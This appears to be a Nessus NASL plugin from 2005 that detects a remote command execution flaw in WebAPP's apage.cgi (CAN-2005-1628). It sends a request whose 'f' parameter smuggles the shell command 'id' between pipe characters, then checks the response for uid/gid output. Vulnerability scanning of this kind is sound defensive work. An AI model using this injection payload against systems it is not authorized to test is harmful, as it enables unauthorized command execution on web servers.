#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  Ref: Status-x <phr4xz@gmail.com>
#
#  This script is released under the GNU GPL v2
#
if(description)
{
 script_id(18292);
 script_cve_id("CAN-2005-1628");
 script_bugtraq_id(13637);
 script_version ("$Revision: 1.4 $");
 name["english"] = "WebAPP Apage.CGI remote command execution flaw";
 script_name(english:name["english"]);
 
 desc["english"] = "
Due to a lack of user input validation, an attacker can exploit the
'apage.cgi' script in the version of WebAPP on the remote host to
execute arbitrary commands on the remote host with the privileges of
the web server. 

Solution : Upgrade to WebAPP version 0.9.9.2 or newer.
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for apage.cgi remote command execution flaw";
 
 script_summary(english:summary["english"]);
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("webapp_detect.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/webapp"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
 dir = matches[2];
 req = http_get(item:string(dir,"/mods/apage/apage.cgi?f=file.htm.|id|"), port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if(r == NULL)exit(0);
 if ( egrep(pattern:"uid=[0-9].*gid=[0-9].*", string:r) )
      {
      security_hole(port);
      exit(0);
      }
}
